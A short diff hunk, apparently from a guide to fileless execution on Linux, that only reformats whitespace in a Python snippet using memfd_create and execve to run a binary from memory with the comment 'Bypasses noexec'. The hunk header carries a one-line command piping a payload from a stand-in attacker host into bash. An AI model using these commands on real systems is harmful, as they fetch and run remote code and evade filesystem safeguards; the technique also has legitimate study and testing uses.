@@ -118,11 +118,12 @@ curl -sL https://attacker.com/payload | bash ddexec.sh
 
 ```python
 import ctypes, os
+
 libc = ctypes.CDLL("libc.so.6")
-fd = libc.syscall(319, b"", 0)     # SYS_MEMFD_CREATE (x86_64)
+fd = libc.syscall(319, b"", 0)  # SYS_MEMFD_CREATE (x86_64)
 with open(f"/proc/self/fd/{fd}", "wb") as f:
     f.write(open("/path/to/binary", "rb").read())
-os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)   # Bypasses noexec
+os.execve(f"/proc/self/fd/{fd}", ["binary"], os.environ)  # Bypasses noexec
 ```
 
 ```bash
